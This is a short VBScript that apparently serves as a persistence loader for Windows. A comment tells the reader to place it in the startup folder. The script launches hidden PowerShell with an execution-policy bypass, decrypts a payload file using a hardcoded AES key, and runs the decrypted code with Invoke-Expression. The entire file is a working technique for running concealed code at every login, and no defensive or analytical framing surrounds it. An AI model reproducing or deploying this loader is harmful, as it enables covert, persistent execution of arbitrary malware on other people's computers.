' You can import this code as a file.vbs inside the startup folder like shell:startup in windows

Set objShell = CreateObject("WScript.Shell")

command = "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; " & _
    "$encrypted = Get-Content -Path '@path' -Raw; " & _ 
    "$aesKey = (2,3,1,4,54,32,144,23,5,3,1,41,36,31,18,175,6,17,1,9,5,1,76,23); " & _ 
    "$secureObject = ConvertTo-SecureString -String $encrypted -Key $aesKey; " & _ 
    "$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject); " & _ 
    "$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted); " & _ 
    "Invoke-Expression $decrypted " 

objShell.Run("powershell.exe -WindowStyle Hidden -Command " + command)